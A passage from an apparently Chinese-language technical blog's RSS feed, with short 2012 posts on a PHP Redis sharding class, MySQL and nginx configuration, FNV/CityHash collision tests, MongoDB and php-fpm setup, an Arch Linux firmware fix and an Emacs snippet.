<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>] != $<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>]){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(! $<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>]-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">select</span>($<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>])){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">trigger_error(</span><span style="color: #8abeb7;">'redis error: select '</span> . $<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>] . <span style="color: #8abeb7;">':'</span> .<span style="text-decoration: underline;"> $</span><span style="color: #f0c674; text-decoration: underline;">shard</span><span style="text-decoration: underline;">[</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">1</span><span style="text-decoration: underline;">] . </span><span style="color: #8abeb7; text-decoration: underline;">':'</span><span style="text-decoration: underline;"> .$</span><span style="color: #f0c674; text-decoration: underline;">shard</span><span style="text-decoration: underline;">[</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">2</span><span style="text-decoration: underline;">], </span><span style="color: #81a2be; text-decoration: underline;">E_USER_ERROR</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">false</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>] = $<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>];
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> $<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>];
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>]-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">close</span>();
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">unset(</span>$<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#26032;&#24314;&#36830;&#25509;.</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>] = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Redis</span>();
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(! $<span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>]-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">connect</span>($<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>], $<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>])){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">trigger_error(</span><span style="color: #8abeb7;">'redis error: connect '</span> . $<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>] . <span style="color: #8abeb7;">':'</span> . $<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>],<span style="text-decoration: underline;"> </span><span style="color: #81a2be; text-decoration: underline;">E_USER_ERROR</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">false</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">db</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">intval(</span>$<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>]);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">db</span> != <span style="color: #c5c8c6; background-color: #1d1f21;">0</span> <span style="color: #b5bd68;">and</span> !$<span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>]-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">select</span>($<span style="color: #f0c674;">db</span>)){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">trigger_error(</span><span style="color: #8abeb7;">'redis error: select '</span> . $<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>] . <span style="color: #8abeb7;">':'</span> . $<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>] .<span style="text-decoration: underline;"> </span><span style="color: #8abeb7; text-decoration: underline;">':'</span><span style="text-decoration: underline;"> .$</span><span style="color: #f0c674; text-decoration: underline;">shard</span><span style="text-decoration: underline;">[</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">2</span><span style="text-decoration: underline;">], </span><span style="color: #81a2be; text-decoration: underline;">E_USER_ERROR</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>]-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">close</span>();
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">false</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #cc6666; font-weight: bold;">ENABLE_DEVELOP</span>){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">trigger_error(</span><span style="color: #8abeb7;">'redis connect success. '</span> . $<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>] . <span style="color: #8abeb7;">':'</span> . $<span style="color: #f0c674;">shard</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">1</span><span style="text-decoration: underline;">] . </span><span style="color: #8abeb7; text-decoration: underline;">':'</span><span style="text-decoration: underline;"> . $</span><span style="color: #f0c674; text-decoration: underline;">shard</span><span style="text-decoration: underline;">[</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">2</span><span style="text-decoration: underline;">], </span><span style="color: #81a2be; text-decoration: underline;">E_USER_NOTICE</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }<span style="color: #cc6666; background-color: #373b41;">        </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span> = $<span style="color: #f0c674;">shard</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> $<span style="color: #81a2be;">this</span>-&gt;<span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>];
<span style="background-color: #373b41;"> </span>   }
}
</pre>
</div>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[解决mysql_connect慢的问题]]></title>
            <link>/article/89e351b3-mysql_connect-6162768495ee9898.html</link>
            <guid>/article/89e351b3-mysql_connect-6162768495ee9898.html</guid>
            <pubDate>Thu, 06 Dec 2012 02:25:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
压测时发现mysql_connect耗时超过30秒，登录mysql后执行show processlist，显示超过800个连接状态如下：
</p>

<pre class="example">
unauthenticated user | XXXX.XXX.XXX.XXX:XXXX  | NULL | Connect     |  NULL | login
</pre>

<p>
经求教运维，在my.cnf中的“[mysqld]”下添加以下配置行即可：
</p>

<pre class="example">
skip-name-resolve
</pre>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Fnv算法冲突率测试]]></title>
            <link>/article/fnv-7b976cd551b27a8173876d4b8bd5.html</link>
            <guid>/article/fnv-7b976cd551b27a8173876d4b8bd5.html</guid>
            <pubDate>Sat, 24 Nov 2012 10:31:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1"><a href="http://www.isthe.com/chongo/tech/comp/fnv/">Fnv</a>介绍</h2>
<div class="outline-text-2" id="text-1">
<p>
Fnv是和 <a href="http://code.google.com/p/cityhash/">CityHash</a> 类似的哈希算法。这里重复《<a href="http://blog.kankanan.com/posts/2012/11/24_cityhash7b976cd551b27a8173876d4b8bd5.html">CityHash算法冲突率测试</a>》，做为一个对比。
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">测试样本数据</h2>
<div class="outline-text-2" id="text-2">
<p>
16630591行不重复字符串，每一行内容为以制表符分隔的下载地址和引用页。
</p>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">fnv64测试结果</h2>
<div class="outline-text-2" id="text-3">
<p>
没有冲突
</p>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">fnv32测试结果</h2>
<div class="outline-text-2" id="text-4">
<p>
共31948次冲突，冲突率约为千分之二。
同一哈希值上33次冲突二次，31879次冲突一次。
冲突率比CityHash略低，少了298次。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[CityHash算法冲突率测试]]></title>
            <link>/article/cityhash-7b976cd551b27a8173876d4b8bd5.html</link>
            <guid>/article/cityhash-7b976cd551b27a8173876d4b8bd5.html</guid>
            <pubDate>Sat, 24 Nov 2012 10:21:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1"><a href="http://code.google.com/p/cityhash/">CityHash</a>介绍</h2>
<div class="outline-text-2" id="text-1">
<p>
<a href="http://www.google.com">Google</a> 2010年开始开发并开源的字符串哈希算法，主要包含CityHash32()、CityHash64()和CityHash128()，分别对应32位、64位、128位哈希算法。
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">测试样本数据</h2>
<div class="outline-text-2" id="text-2">
<p>
16630591行不重复字符串，每一行内容为以制表符分隔的下载地址和引用页。
</p>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">cityhash64测试结果</h2>
<div class="outline-text-2" id="text-3">
<p>
没有冲突
</p>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">cityhash32测试结果</h2>
<div class="outline-text-2" id="text-4">
<p>
共32246次冲突，冲突率约为千分之二。
同一哈希值上55次冲突二次，32136次冲突一次。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[memcached_get会重置过期时间吗？]]></title>
            <link>/article/memcached_get-4f1a91cd7f6e8fc7671f65f695f45417ff1f.html</link>
            <guid>/article/memcached_get-4f1a91cd7f6e8fc7671f65f695f45417ff1f.html</guid>
            <pubDate>Tue, 13 Nov 2012 12:29:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
不会。获取数据的操作不会影响数据的过期时间，最新的memcache1.6添加了touch和GAT（get and touch)命令，可以在获取数据时过期时间。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[理解nginx的keepalive_timeout配置项]]></title>
            <link>/article/740689e3-nginx-7684-keepalive_timeout-914d7f6e9879.html</link>
            <guid>/article/740689e3-nginx-7684-keepalive_timeout-914d7f6e9879.html</guid>
            <pubDate>Mon, 12 Nov 2012 09:05:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
不要误以为它是指tcp连接空闲多少秒后关闭，它仅表示连接建立多少秒后关闭，不会在一次请求后重新计时。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[如何做面试]]></title>
            <link>/article/59824f55505a97628bd5.html</link>
            <guid>/article/59824f55505a97628bd5.html</guid>
            <pubDate>Wed, 24 Oct 2012 06:23:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">语言基础</h2>
</div>
<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">相关技术</h2>
</div>
<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">性能优化</h2>
</div>
<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">架构</h2>
</div>
<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5">管理</h2>
</div>
<div id="outline-container-sec-6" class="outline-2">
<h2 id="sec-6">诉求</h2>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[MongoDB基础]]></title>
            <link>/article/mongodb-57fa7840.html</link>
            <guid>/article/mongodb-57fa7840.html</guid>
            <pubDate>Sun, 21 Oct 2012 09:06:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">MongoDB与Mysql的基本结构对应关系</h2>
<div class="outline-text-2" id="text-1">
</div><div id="outline-container-sec-1-1" class="outline-3">
<h3 id="sec-1-1">一台机器</h3>
<div class="outline-text-3" id="text-1-1">
<p>
computer
</p>
</div>

<div id="outline-container-sec-1-1-1" class="outline-4">
<h4 id="sec-1-1-1">多个MongoDB实例                                          &lt;&#x2013;对应&#x2013;&gt;                    mysql服务器进程</h4>
<div class="outline-text-4" id="text-1-1-1">
<p>
MongoDB Instance                                        &lt;&#x2013;对应&#x2013;&gt;                    Mysqld Instance
</p>

<p>
运行着的MongoDB后台服务进程：/etc/rc.d/mongodb start      &lt;&#x2013;对应&#x2013;&gt;                     /etc/rc.d/mysqld start
</p>
</div>

<div id="outline-container-sec-1-1-1-1" class="outline-5">
<h5 id="sec-1-1-1-1">多个数据库                                              &lt;&#x2013;对应&#x2013;&gt;                    mysql中的数据库</h5>
<div class="outline-text-5" id="text-1-1-1-1">
<p>
MongoDB Database                                       &lt;&#x2013;对应&#x2013;&gt;                     Database
</p>
</div>

<div id="outline-container-sec-1-1-1-1-1" class="outline-6">
<h6 id="sec-1-1-1-1-1">多个集合                                               &lt;&#x2013;对应&#x2013;&gt;                    mysql中的表</h6>
<div class="outline-text-6" id="text-1-1-1-1-1">
<p>
MongoDB Collection                                    &lt;&#x2013;对应&#x2013;&gt;                     Table
</p>
</div>

<div id="outline-container-sec-1-1-1-1-1-1" class="outline-7">
<h7 id="sec-1-1-1-1-1-1">多个文档                                             &lt;&#x2013;对应&#x2013;&gt;                     mysql中的记录行</h7>
<div class="outline-text-7" id="text-1-1-1-1-1-1">
<p>
MongoDB Document                                     &lt;&#x2013;对应&#x2013;&gt;                    Row
</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">CentOS上搭建环境</h2>
<div class="outline-text-2" id="text-2">
<dl class="org-dl">
<dt> 添加源/etc/yum.repos.d/10gen.repo </dt><dd><pre class="example">
[10gen]
name=10gen Repository
baseurl=http://downloads-distro.mongodb.org/repo/redhat/os/x86_64
gpgcheck=0
</pre>
</dd>
<dt> 安装服务器客户端程序 </dt><dd><div class="org-src-container">

<pre class="src src-sh">yum install mongo-10gen mongo-10gen-server
</pre>
</div>
</dd>
<dt> 安装php扩展 </dt><dd><div class="org-src-container">

<pre class="src src-sh">yum -y install make gcc php-devel
yum install php-pear
<span style="color: #f0c674;">PATH</span>=$<span style="color: #f0c674;">PATH</span>:/usr/local/php/bin/ pecl install mongo
</pre>
</div>
<p>
php.ini中添加：extension=mongo.so
</p>
</dd>
<dt> 启动服务 </dt><dd>     /etc/rc.d/init.d/mongodb start
</dd>
</dl>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[php中DOMDocument类createElement和createTextNode的区别]]></title>
            <link>/article/php-4e2d-domdocument-7c7b-createelement-548c-createtextnode-7684533a522b.html</link>
            <guid>/article/php-4e2d-domdocument-7c7b-createelement-548c-createtextnode-7684533a522b.html</guid>
            <pubDate>Thu, 27 Sep 2012 11:05:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">DOMDocument::createElement</h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li>原型：DOMElement DOMDocument::createElement ( string $name [, string $value ] )

<p>
创建一个元素，其中第二个参数是可选的，不会对它进行转义。当value中包含特殊字符（如：&amp;）会出错。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">Domdocument::createTextNode</h2>
<div class="outline-text-2" id="text-2">
<ul class="org-ul">
<li>原型：DOMText DOMDocument::createTextNode ( string $content )

<p>
创建一个文本结点，会对其内容进行转义。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">典型示例：创建一个文本元素</h2>
<div class="outline-text-2" id="text-3">
<div class="org-src-container">

<pre class="src src-php">$<span style="color: #f0c674;">element</span> = $<span style="color: #f0c674;">doc</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">createElement</span>(<span style="color: #8abeb7;">"city"</span>);
$<span style="color: #f0c674;">node</span> = $<span style="color: #f0c674;">doc</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">createTextNode</span>(<span style="color: #8abeb7;">"shenzhen"</span>);
$<span style="color: #f0c674;">element</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">appendChild</span>($<span style="color: #f0c674;">node</span>);
$<span style="color: #f0c674;">doc</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">appendChild</span>($<span style="color: #f0c674;">element</span>);
</pre>
</div>
<ul class="org-ul">
<li>对应的xml文档：
</li>
</ul>
<div class="org-src-container">

<pre class="src src-xml">&lt;<span style="color: #de935f;">city</span>&gt;shenzhen&lt;/<span style="color: #de935f;">city</span>&gt;
</pre>
</div>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[解决Archlinux下ati显卡3D硬件加速失效的问题]]></title>
            <link>/article/89e351b3-archlinux-4e0b-ati-663e5361-3d-786c4ef652a0901f59316548768495ee9898.html</link>
            <guid>/article/89e351b3-archlinux-4e0b-ati-663e5361-3d-786c4ef652a0901f59316548768495ee9898.html</guid>
            <pubDate>Wed, 05 Sep 2012 15:52:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">问题描述</h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li>症状

<p>
进入gnome3桌面环境后很卡，不动还好，一动gnome-shell进程cpu占用就直奔100%。
</p>
</li>

<li>dmesg异常日志
<pre class="example">
radeon_cp: Failed to load firmware "radeon/R520_cp.bin"
radeon 0000:01:00.0: failed initializing CP (-2).
radeon 0000:01:00.0: Disabling GPU acceleration
</pre>
</li>
</ul>
</div>
</div>
<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">解决办法</h2>
<div class="outline-text-2" id="text-2">
<div class="org-src-container">

<pre class="src src-sh">sudo ln -s /usr/lib/firmware /lib/
sudo reboot
</pre>
</div>
</div>
</div>
<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">经验总结</h2>
<div class="outline-text-2" id="text-3">
<p>
出现问题时网上不一定能找到你要的答案，像这个问题，网上的论坛里有无数个建议，一个一个试下去其实很浪费时间，
试几次之后还没能解决就应该尝试主动分析解决，像这里稍微留意到括号里的-2，就能发现其实它是个错误码，
perror一下就知道意思是“找不到文件或目录”，联想到最近几次升级archlinux在把/lib里的东西往/usr/lib下移，
其中就包括firemware，这样手工在旧的firmware位置建一个软链接就解决了这个问题。
</p>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">备注</h2>
<div class="outline-text-2" id="text-4">
<p>
这个问题应该是由于之前glibc升级时未全部完成引起的，archlinux现在把/lib改为/usr/lib的软链接了，可以手工进行设置为软链接这一步骤来修复。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[nginx下快速搭建php运行环境]]></title>
            <link>/article/nginx-4e0b5feb901f642d5efa-php-8fd0884c73af5883.html</link>
            <guid>/article/nginx-4e0b5feb901f642d5efa-php-8fd0884c73af5883.html</guid>
            <pubDate>Sat, 11 Aug 2012 13:09:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">安装</h2>
<div class="outline-text-2" id="text-1">
</div><div id="outline-container-sec-1-1" class="outline-3">
<h3 id="sec-1-1">安装nginx</h3>
<div class="outline-text-3" id="text-1-1">
<p>
yaourt -S nginx
</p>
</div>
</div>
<div id="outline-container-sec-1-2" class="outline-3">
<h3 id="sec-1-2">安装php</h3>
<div class="outline-text-3" id="text-1-2">
<p>
yaourt -S php
</p>
</div>
</div>
<div id="outline-container-sec-1-3" class="outline-3">
<h3 id="sec-1-3">安装php-fpm</h3>
<div class="outline-text-3" id="text-1-3">
<p>
yaourt -S php-fpm
</p>
</div>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">配置</h2>
<div class="outline-text-2" id="text-2">
</div><div id="outline-container-sec-2-1" class="outline-3">
<h3 id="sec-2-1">配置nginx</h3>
<div class="outline-text-3" id="text-2-1">
<ul class="org-ul">
<li>将nginx.conf中的以下部分：
<pre class="example">
#location ~ \.php$ {
...
#}
</pre>
</li>
<li>修改为
<pre class="example">
location ~ \.php$ {
   root           /usr/share/nginx/html;
   fastcgi_pass   127.0.0.1:9000;
   fastcgi_index  index.php;
   fastcgi_param  SCRIPT_FILENAME  /usr/share/nginx/html$fastcgi_script_name;
   include        fastcgi_params;
}
</pre>
</li>
</ul>
</div>
</div>
<div id="outline-container-sec-2-2" class="outline-3">
<h3 id="sec-2-2">配置php</h3>
<div class="outline-text-3" id="text-2-2">
<p>
在open_basedir中添加：/usr/share/nginx/html
</p>
</div>
</div>
<div id="outline-container-sec-2-3" class="outline-3">
<h3 id="sec-2-3">配置php-fpm.conf</h3>
<div class="outline-text-3" id="text-2-3">
<p>
启用以下listen配置：
listen = 127.0.0.1:9000
</p>
</div>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">运行</h2>
<div class="outline-text-2" id="text-3">
<ul class="org-ul">
<li>重启nginx
<div class="org-src-container">

<pre class="src src-sh">sudo /etc/rc.d/nginx restart
</pre>
</div>
</li>
<li>启动php-fpm
<div class="org-src-container">

<pre class="src src-sh">sudo php-fpm
</pre>
</div>
</li>
<li>然后在/usr/share/nginx/html目录中写php脚本即可。
</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[在emacs模式行上显示图片的尺寸]]></title>
            <link>/article/5728-emacs-6a215f0f884c4e0a663e793a56fe724776845c3a5bf8.html</link>
            <guid>/article/5728-emacs-6a215f0f884c4e0a663e793a56fe724776845c3a5bf8.html</guid>
            <pubDate>Fri, 03 Aug 2012 00:55:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
下面的lisp代码用于在emacs模式行上显示图片的尺寸：
</p>
<div class="org-src-container">

<pre class="src src-lisp">(add-hook 'image-mode-hook (<span style="color: #b5bd68;">lambda</span> ()
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span> <span style="color: #b294bb;">"display image size on mode line."</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span> (setq mode-name (format <span style="color: #8abeb7;">"Image[%s](%s*%s)"</span><span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span> image-type<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span> (car (image-size (image-get-di<span style="text-decoration: underline;">splay-property) t))</span><span style="color: #cc6666; background-color: #373b41; text-decoration: underline;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span> (cdr (image-size (image-get-di<span style="text-decoration: underline;">splay-property) t))))))</span>
</pre>
</div>

<dl class="org-dl">
<dt> 效果如下 </dt><dd></dd>
</dl>
<pre class="example">
[(Image[png](181*415))]
</pre>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[在python中安装mysqldb模块]]></title>
            <link>/article/5728-python-4e2d5b8988c5-mysqldb-6a215757.html</link>
            <guid>/article/5728-python-4e2d5b8988c5-mysqldb-6a215757.html</guid>
            <pubDate>Wed, 01 Aug 2012 00:55:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">正常的安装过程</h2>
<div class="outline-text-2" id="text-1">
<div class="org-src-container">

<pre class="src src-sh"><span style="background-color: #373b41;"> </span> wget <span style="color: #8abeb7;">"http://downloads.sourceforge.net/project/mysql-python/mysql-python\</span>
<span style="color: #8abeb7;">/1.2.3/MySQL-python-1.2.3.tar.gz?r=http%3A%2F%2Fsourceforge.net%2Fprojects\</span>
<span style="color: #8abeb7;">%2Fmysql-python%2Ffiles%2F&amp;ts=1304062611&amp;use_mirror=nchc"</span>
<span style="background-color: #373b41;"> </span> tar xzvf MySQL-python-1.2.3.tar.gz
<span style="background-color: #373b41;"> </span> <span style="color: #b294bb;">cd</span> MySQL-python-1.2.3
<span style="background-color: #373b41;"> </span> python setup.py build
